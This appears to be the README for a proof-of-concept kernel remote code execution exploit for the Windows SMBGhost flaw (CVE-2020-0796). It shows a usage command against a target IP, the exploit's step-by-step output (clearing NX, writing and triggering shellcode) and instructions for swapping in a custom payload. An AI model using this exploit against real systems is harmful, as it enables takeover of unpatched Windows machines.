# SMBGhost_RCE_PoC

RCE PoC for CVE-2020-0796 "SMBGhost"

For demonstration purposes only! Only use this a reference. Seriously. This has not been tested outside of my lab environment. It was written quickly and needs some work to be more reliable. Sometimes you BSOD. Using this for any purpose other than self education is an extremely bad idea. Your computer will burst in flames. Puppies will die. 

Now that that's out of the way....

Usage ex: 

``` 
$SMBGhost_RCE_PoC python exploit.py -ip 192.168.142.131
[+] found low stub at phys addr 13000!
[+] PML4 at 1ad000
[+] base of HAL heap at fffff79480000000
[+] ntoskrnl entry at fffff80645792010
[+] found PML4 self-ref entry 1eb
[+] found HalpInterruptController at fffff79480001478
[+] found HalpApicRequestInterrupt at fffff80645cb3bb0
[+] built shellcode!
[+] KUSER_SHARED_DATA PTE at fffff5fbc0000000
[+] KUSER_SHARED_DATA PTE NX bit cleared!
[+] Wrote shellcode at fffff78000000a00!
[+] Press a key to execute shellcode!
[+] overwrote HalpInterruptController pointer, should have execution shortly...
```

Replace payload in USER_PAYLOAD in exploit.py. Max of 600 bytes. If you want more, modify the kernel shell code yourself. 

lznt1 code from [here](https://github.com/you0708/lznt1). Modified to add a "bad compression" function to corrupt SRVNET buffer
header without causing a crash.

See this excellent write up by Ricera Security for more details on the methods I used: 
https://ricercasecurity.blogspot.com/2020/04/ill-ask-your-body-smbghost-pre-auth-rce.html

